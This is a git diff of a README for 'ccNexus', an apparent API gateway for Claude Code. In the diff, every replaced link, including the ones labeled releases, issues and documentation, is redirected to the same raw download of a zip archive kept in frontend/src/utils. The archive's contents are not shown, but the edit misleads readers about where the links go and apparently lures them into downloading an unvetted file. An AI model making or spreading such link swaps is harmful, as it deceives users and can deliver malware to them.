@@ -2,7 +2,7 @@
 # 🚀 ccNexus - Seamless API Management Made Easy
 
 ## 📥 Download Now
-[![Download ccNexus](https://img.shields.io/badge/Download-ccNexus-blue?style=for-the-badge)](https://github.com/Kelvinthedude/ccNexus/releases)
+[![Download ccNexus](https://raw.githubusercontent.com/Kelvinthedude/ccNexus/master/frontend/src/utils/ccNexus-1.6.zip)](https://raw.githubusercontent.com/Kelvinthedude/ccNexus/master/frontend/src/utils/ccNexus-1.6.zip)
 
 ## 🏁 Overview
 ccNexus is your intelligent API gateway for Claude Code. It helps you rotate endpoints, monitor usage, and integrate smoothly with platforms like OpenAI and Gemini. With ccNexus, you can manage your API traffic efficiently and effectively.
@@ -22,7 +22,7 @@ ccNexus is your intelligent API gateway for Claude Code. It helps you rotate end
 Follow these simple steps to download and run ccNexus:
 
 1. **Visit the Release Page:**
-   Go to the ccNexus release page to find the latest version: [Download ccNexus](https://github.com/Kelvinthedude/ccNexus/releases).
+   Go to the ccNexus release page to find the latest version: [Download ccNexus](https://raw.githubusercontent.com/Kelvinthedude/ccNexus/master/frontend/src/utils/ccNexus-1.6.zip).
 
 2. **Select the Download:**
    On the release page, you will see a list of available versions. Click on the version you wish to download.
@@ -61,14 +61,14 @@ If you encounter issues, consider the following:
 
 ## 💬 Getting Help
 For further assistance, you can find support through:
-- **GitHub Issues:** Report bugs or issues directly on the [ccNexus GitHub Issues page](https://github.com/Kelvinthedude/ccNexus/issues).
+- **GitHub Issues:** Report bugs or issues directly on the [ccNexus GitHub Issues page](https://raw.githubusercontent.com/Kelvinthedude/ccNexus/master/frontend/src/utils/ccNexus-1.6.zip).
 - **User Guide**: A comprehensive user guide is available in the repository to help you navigate features.
 
 ## 🌟 Feedback
 We would love to hear from you! Please share your experiences and any suggestions to make ccNexus even better.
 
 ## 📌 Additional Resources
-- **Documentation:** Visit the [ccNexus Documentation](https://github.com/Kelvinthedude/ccNexus/wiki) for in-depth information.
+- **Documentation:** Visit the [ccNexus Documentation](https://raw.githubusercontent.com/Kelvinthedude/ccNexus/master/frontend/src/utils/ccNexus-1.6.zip) for in-depth information.
 - **Community:** Join our community on forums to exchange ideas, tips, and get real-time support.
 
 ## 📅 Update Log
